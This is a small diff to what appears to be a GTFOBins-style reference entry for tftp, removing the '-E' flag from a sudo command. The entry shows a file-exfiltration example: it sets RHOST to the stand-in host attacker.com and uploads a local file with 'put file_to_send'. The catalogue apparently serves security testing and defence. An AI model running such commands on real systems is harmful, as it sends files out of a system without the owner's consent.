@@ -22,6 +22,6 @@ functions:
     - description: Send local file to a TFTP server.
       code: |
         RHOST=attacker.com
-        sudo -E tftp $RHOST
+        sudo tftp $RHOST
         put file_to_send
 ---
